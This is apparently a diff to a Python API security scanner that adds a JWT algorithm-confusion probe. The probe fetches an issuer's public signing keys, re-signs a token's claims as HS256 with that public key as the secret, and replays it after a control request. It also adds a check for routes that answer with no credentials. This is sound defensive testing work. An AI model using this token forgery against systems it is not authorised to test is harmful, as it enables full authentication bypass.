@@ -11,7 +11,9 @@ same from outside.
 """
 from __future__ import annotations
 
+import json
 import re
+import secrets
 from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
 
 from . import jwtlab
@@ -23,6 +25,13 @@ ADMIN_PATH = re.compile(r"(?i)/(admin|administrator|manage|management|internal|p
 ID_PARAM = re.compile(r"(?i)^(id|.*_id|.*Id|uid|uuid|guid|key|ref|no|num|number|code|slug|account|user|customer|order|invoice|document|file)$")
 UUID = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
 PROBE_ORIGIN = "https://namazu-probe.invalid"
+
+
+# RFC 8414: where an authorization server publishes what it signs with.
+METADATA_PATH = "/.well-known/openid-configuration"
+# Each PEM encoding is a different HMAC secret, so each is a separate request.
+# Four is enough for the forms in use without turning one probe into a sweep.
+MAX_CONFUSION_PROBES = 4
 
 
 def _swap_path_segment(url: str, index: int, value: str) -> str:
@@ -107,7 +116,8 @@ def probe(executor: Executor, *, baseline: Exchange, endpoint: str, operation: d
         findings += _cors_reflection(executor, baseline, endpoint, base_headers)
         findings += _method_tampering(executor, baseline, endpoint, base_headers)
         if authed:
-            findings += _jwt_replay(executor, baseline, endpoint, identity_a, base_headers)
+            findings += _jwt_replay(executor, baseline, endpoint, identity_a, base_headers,
+                                    anonymous)
     except BudgetExhausted:
         pass
     return findings
@@ -372,7 +382,8 @@ def _method_tampering(executor, baseline, endpoint, base_headers) -> list:
     return out
 
 
-def _jwt_replay(executor, baseline, endpoint, identity_a, base_headers) -> list:
+def _jwt_replay(executor, baseline, endpoint, identity_a, base_headers,
+                anonymous=None) -> list:
     """Forge a token offline, then replay it on a read-only route."""
     token = jwtlab.bearer_token(identity_a)
     if not token:
@@ -403,6 +414,14 @@ def _jwt_replay(executor, baseline, endpoint, identity_a, base_headers) -> list:
         ))
 
     if not header_name or not executor.affordable(2):
+        return out
+
+    # A route that answers with no credentials at all proves nothing about
+    # signature verification: a forged token is "accepted" because no token
+    # was needed. _anonymous_replay reports that, and reporting a signature
+    # bypass on top of it would be two findings for one cause, the second
+    # wrong. The offline weaknesses above stand either way.
+    if _open_route(baseline, anonymous):
         return out
 
     scheme = identity_a[header_name].split(" ", 1)[0] if " " in identity_a[header_name] else "Bearer"
@@ -454,4 +473,151 @@ def _jwt_replay(executor, baseline, endpoint, identity_a, base_headers) -> list:
                 evidence={"secret": secret, "escalated_claims": escalated, "status": probe_exchange.status},
                 exchanges=[baseline, probe_exchange],
             ))
+            return out
+
+    out += _jwt_alg_confusion(executor, baseline, endpoint, report, header_name, scheme,
+                              base_headers)
     return out
+
+
+def _open_route(baseline, anonymous) -> bool:
+    """Does this route return the same data with no credentials at all?"""
+    return (anonymous is not None and _looks_like_data(anonymous)
+            and similarity(baseline.body, anonymous.body) >= 0.95)
+
+
+def _accepted(baseline, probe) -> bool:
+    """Did a forged token get the genuine response back?"""
+    return (probe.ok and 200 <= probe.status < 300
+            and similarity(baseline.body, probe.body) >= 0.9)
+
+
+def _json_document(exchange):
+    if not exchange.ok or not 200 <= exchange.status < 300:
+        return None
+    try:
+        value = json.loads(exchange.body)
+    except (ValueError, TypeError):
+        return None
+    return value if isinstance(value, dict) else None
+
+
+def _issuer_keys(executor, issuer: str):
+    """The issuer's own signing keys, via its metadata document.
+
+    Two GETs of documents that are public by design. The issuer is the one the
+    operator's own token names, so it is part of the system under test rather
+    than a host Namazu went looking for, and no credential or operator header
+    crosses to it.
+
+    A jku or x5u header is deliberately not followed. Those are attacker-
+    controllable by definition, which is why their presence is already a
+    finding of its own; fetching key material from one would measure nothing
+    about the server.
+    """
+    try:
+        metadata = executor.send(
+            "GET", issuer.rstrip("/") + METADATA_PATH,
+            label="fetch the token issuer's metadata", headers={}, identity="anonymous")
+    except ValueError:
+        return [], ""
+    document = _json_document(metadata)
+    jwks_uri = (document or {}).get("jwks_uri")
+    if not isinstance(jwks_uri, str) or not jwks_uri.strip():
+        return [], ""
+    try:
+        response = executor.send("GET", jwks_uri.strip(),
+                                 label="fetch the token issuer's signing keys",
+                                 headers={}, identity="anonymous")
+    except ValueError:
+        return [], ""
+    return jwtlab.jwks_signing_keys(_json_document(response) or {}), jwks_uri.strip()
+
+
+def _jwt_alg_confusion(executor, baseline, endpoint, report, header_name, scheme,
+                       base_headers) -> list:
+    """Re-sign an RSA-signed token as HS256 with the public key as the secret.
+
+    The bug is one line: the verifier is handed the token's own declared
+    algorithm instead of the one the route expects. The key material it then
+    HMACs against is the RSA public key, which anyone can fetch.
+    """
+    if not report["algorithm"].startswith(("RS", "PS")):
+        return []
+    issuer = report.get("issuer")
+    if not isinstance(issuer, str) or not issuer.strip():
+        return []
+    # Metadata, key set, the control, and at least one forged token.
+    if not executor.affordable(4):
+        return []
+
+    keys, jwks_uri = _issuer_keys(executor, issuer.strip())
+    if not keys or not executor.affordable(2):
+        return []
+
+    # The control, and the reason this can be reported as confirmed. A token
+    # signed with a secret nobody could know must be refused. If it is
+    # accepted, the server is not verifying HMAC signatures at all, which is a
+    # different finding and one the alg:none probe above already covers.
+    decoy = jwtlab.forge_hmac(report["claims"], secrets.token_bytes(32), alg="HS256",
+                              header_extra={"kid": report["key_id"]} if report.get("key_id") else None)
+    control = executor.send(
+        baseline.method, baseline.url,
+        label="control: replay with an HS256 token signed by a secret nobody holds",
+        headers={**base_headers, header_name: f"{scheme} {decoy}"}, identity="forged")
+    if not control.ok or _accepted(baseline, control):
+        return []
+
+    sent = 0
+    for key in keys:
+        for label, material in jwtlab.confusion_keys(key):
+            if sent >= MAX_CONFUSION_PROBES or not executor.affordable(1):
+                return []
+            sent += 1
+            key_id = key.get("kid") or report.get("key_id")
+            forged = jwtlab.forge_hmac(
+                report["claims"], material, alg="HS256",
+                header_extra={"kid": key_id} if key_id else None)
+            probe_exchange = executor.send(
+                baseline.method, baseline.url,
+                label=f"replay as HS256 signed with the {label} of the issuer's public key",
+                headers={**base_headers, header_name: f"{scheme} {forged}"}, identity="forged")
+            if not _accepted(baseline, probe_exchange):
+                continue
+            return [finding(
+                "jwt.alg-confusion", "An RSA-signed token is accepted when re-signed as HS256",
+                "critical", "confirmed", owasp="API2:2023 Broken Authentication",
+                endpoint=endpoint,
+                method=(f"Fetched the issuer's public signing key from {jwks_uri}, re-encoded the "
+                        f"supplied token's own claims with alg:HS256, signed them with that public "
+                        f"key's {label} as the HMAC secret, and replayed the read-only request. A "
+                        "control token signed with an unrelated 32-byte secret was sent first and "
+                        "was refused, so the server does verify HMAC signatures. Nothing was "
+                        "written."),
+                highlights=[
+                    mark("re-signed as HS256", "weak",
+                         "The verifier trusted the algorithm named in the token instead of the one "
+                         "this route expects."),
+                    mark("signed with that public key", "proof",
+                         "The signing key is the public key, so anyone who can read the key set "
+                         "can mint a token for any user."),
+                ],
+                detail=(f"The token presented to this route is signed with {report['algorithm']}. "
+                        f"Re-encoding its claims as HS256 and signing them with the issuer's public "
+                        f"key, in its {label} form, as the HMAC secret returned HTTP "
+                        f"{probe_exchange.status} with the same data as the genuine token. The "
+                        "server is verifying against the algorithm the token declares rather than "
+                        "the one it requires, so the public key is being used as a shared secret."),
+                impact=("The verification key is published, so anyone can forge a token for any "
+                        "user or role. This is a full authentication bypass."),
+                remediation=("Pin the accepted algorithm where the token is verified rather than "
+                             "reading it from the token header: pass the expected algorithm "
+                             "explicitly, for example algorithms=['RS256'], and reject any token "
+                             "whose alg is not in that list."),
+                evidence={"token_algorithm": report["algorithm"], "forged_algorithm": "HS256",
+                          "key_encoding": label, "key_id": key_id, "jwks_uri": jwks_uri,
+                          "control_status": control.status, "status": probe_exchange.status,
+                          "body_similarity": similarity(baseline.body, probe_exchange.body)},
+                exchanges=[baseline, control, probe_exchange],
+            )]
+    return []
